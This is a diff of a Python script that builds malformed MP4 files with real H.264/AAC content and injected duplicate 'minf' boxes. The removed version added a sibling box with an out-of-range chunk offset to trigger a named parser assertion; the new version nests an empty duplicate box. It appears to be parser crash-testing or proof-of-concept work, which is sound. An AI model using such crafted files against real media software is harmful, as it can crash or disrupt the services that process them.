@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
-"""Create a roughly 1 MiB MP4 with real H.264/AAC and sibling duplicate minf under mdia.
+"""Create a roughly 10 MiB MP4 with real H.264/AAC and nested empty duplicate minf.
 
-This creates the exact structure needed to trigger assert(minf_offset < prependsz):
-
+Structure:
   mdia
     mdhd
     hdlr
-    minf (first)     ← valid, with stbl
-    minf (second)    ← duplicate SIBLING, with malicious stbl
+    minf (genuine)
+      vmhd
+      dinf
+      stbl
+        stsd, stts, stsc, stsz, stco
+      minf (size=8)    ← empty duplicate, immediately after stbl
 """
 from __future__ import annotations
 import argparse
@@ -18,8 +21,8 @@ import sys
 import tempfile
 from pathlib import Path
 
-DEFAULT_TARGET = 1_048_576
-DEFAULT_DURATION = 10.0
+DEFAULT_TARGET = 10_485_760  # 10 MiB
+DEFAULT_DURATION = 30.0  # 30 seconds for larger file
 CONTAINERS = {b"moov", b"trak", b"mdia", b"minf", b"stbl", b"dinf", b"edts", b"udta"}
 
 
@@ -115,90 +118,64 @@ def shift_chunk_offsets(moov: Box, delta: int) -> int:
     return changed
 
 
-def inject_sibling_duplicate_minf(moov: Box, file_size: int) -> int:
-    """Insert a duplicate minf as a SIBLING (not nested) immediately after the first minf under mdia.
+def inject_empty_nested_duplicate_minf(moov: Box) -> int:
+    """Insert an empty (8-byte) duplicate minf immediately after stbl inside the genuine minf.
 
-    The duplicate minf contains a malicious stbl with:
-      - stco pointing just beyond EOF
-      - stsz describing small samples
-
-    Structure becomes:
-      mdia
-        mdhd
-        hdlr
-        minf (first)     ← valid video minf with stbl
-        minf (second)    ← SIBLING duplicate with malicious stbl
-
-    This triggers: assert(minf_offset < prependsz)
-    because the second minf's offset is AFTER the first minf's prependsz boundary.
+    Structure:
+      minf (genuine)
+        vmhd
+        dinf
+        stbl
+          stsd, stts, stsc, stsz, stco
+        minf (size=8)    ← empty duplicate
     """
     injected = 0
-    invalid_chunk_offset = file_size + 0x1000
 
     for trak in moov.find_all(b"trak"):
         mdia = next(
             (child for child in trak.children or () if child.type == b"mdia"),
             None,
         )
-        if mdia is None or not mdia.children:
+        if mdia is None:
             continue
 
-        # Find hdlr to confirm this is a video track
         hdlr = next(
             (child for child in mdia.children or () if child.type == b"hdlr"),
             None,
         )
-        if hdlr is None or len(hdlr.payload) < 12 or hdlr.payload[8:12] != b"vide":
+        if hdlr is None or len(hdlr.payload) < 12:
             continue
 
-        # Find the first minf under mdia
-        first_minf_index = next(
+        if hdlr.payload[8:12] != b"vide":
+            continue
+
+        genuine_minf = next(
+            (child for child in mdia.children or () if child.type == b"minf"),
+            None,
+        )
+        if genuine_minf is None or not genuine_minf.children:
+            continue
+
+        stbl_index = next(
             (
                 index
-                for index, child in enumerate(mdia.children)
-                if child.type == b"minf"
+                for index, child in enumerate(genuine_minf.children)
+                if child.type == b"stbl"
             ),
             None,
         )
-        if first_minf_index is None:
+        if stbl_index is None:
             continue
 
-        # Create the duplicate minf with malicious stbl
-        stco_payload = struct.pack(
-            ">III",
-            0,  # version + flags
-            1,  # entry_count
-            invalid_chunk_offset,
-        )
-        duplicate_stco = Box(b"stco", stco_payload)
+        # Create an empty 8-byte minf (just the box header, no children)
+        empty_duplicate_minf = Box(b"minf")
 
-        stsz_payload = struct.pack(
-            ">III",
-            0,   # version + flags
-            16,  # sample_size
-            4,   # sample_count
-        )
-        duplicate_stsz = Box(b"stsz", stsz_payload)
-
-        duplicate_stbl = Box(
-            b"stbl",
-            children=[
-                duplicate_stco,
-                duplicate_stsz,
-            ],
-        )
-
-        duplicate_minf = Box(
-            b"minf",
-            children=[duplicate_stbl],
-        )
-
-        # Insert as SIBLING immediately after the first minf (not nested inside it)
-        mdia.children.insert(first_minf_index + 1, duplicate_minf)
+        # Insert immediately after stbl, inside the genuine minf
+        genuine_minf.children.insert(stbl_index + 1, empty_duplicate_minf)
         injected += 1
         print(
-            f"Injected SIBLING duplicate minf in mdia after first minf: "
-            f"stco={invalid_chunk_offset} (file_size={file_size})"
+            f"Injected empty (size=8) duplicate minf immediately after stbl "
+            f"inside genuine minf"
         )
 
     return injected
@@ -232,7 +209,7 @@ def build(source: Path, output: Path) -> None:
         moov = parse_boxes(handle.read(moov_size))[0]
 
     old_size = moov.size
-    injected = inject_sibling_duplicate_minf(moov, file_size)
+    injected = inject_empty_nested_duplicate_minf(moov)
     if not injected:
         raise ValueError("no video track found")
     delta = moov.size - old_size
@@ -246,12 +223,12 @@ def build(source: Path, output: Path) -> None:
             else:
                 src.seek(offset)
                 dst.write(src.read(size))
-    print(f"Injected {injected} SIBLING duplicate minf; moov grew {delta} bytes; shifted {shifted} offsets")
+    print(f"Injected {injected} empty duplicate minf; moov grew {delta} bytes; shifted {shifted} offsets")
 
 
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument("--output", type=Path, default=Path(__file__).resolve().parent / "output" / "1mb_sibling_duplicate_minf.mp4")
+    parser.add_argument("--output", type=Path, default=Path(__file__).resolve().parent / "output" / "10mb_nested_empty_duplicate_minf.mp4")
     parser.add_argument("--size", type=int, default=DEFAULT_TARGET)
     parser.add_argument("--duration", type=float, default=DEFAULT_DURATION)
     args = parser.parse_args()
@@ -259,16 +236,19 @@ def main() -> int:
         ffprobe = tool("ffprobe")
         with tempfile.TemporaryDirectory() as tmp:
             source = Path(tmp) / "source.mp4"
-            print("Encoding source video...")
+            print("Encoding source video (30 seconds)...")
             encode_source(source, args.size, args.duration)
             run([ffprobe, "-v", "error", "-select_streams", "v:0", "-show_entries", "stream=codec_name,width,height", "-of", "default=noprint_wrappers=1", str(source)])
-            print("Building MP4 with SIBLING duplicate minf...")
+            print("Building 10 MiB MP4 with nested empty duplicate minf...")
             build(source, args.output)
         size = args.output.stat().st_size
         print(f"Created {args.output} ({size:,} bytes, {size / (1024 * 1024):.2f} MiB)")
-        print("Contains real H.264 video, AAC audio, and SIBLING duplicate minf:")
-        print("  Structure: mdia > [minf (valid), minf (duplicate SIBLING)]")
-        print("  Trigger: assert(minf_offset < prependsz)")
+        print("Structure:")
+        print("  minf (genuine)")
+        print("    vmhd")
+        print("    dinf")
+        print("    stbl (stsd, stts, stsc, stsz, stco)")
+        print("    minf (size=8, empty duplicate)")
         return 0
     except (RuntimeError, ValueError, subprocess.CalledProcessError) as exc:
         print(f"Error: {exc}", file=sys.stderr)
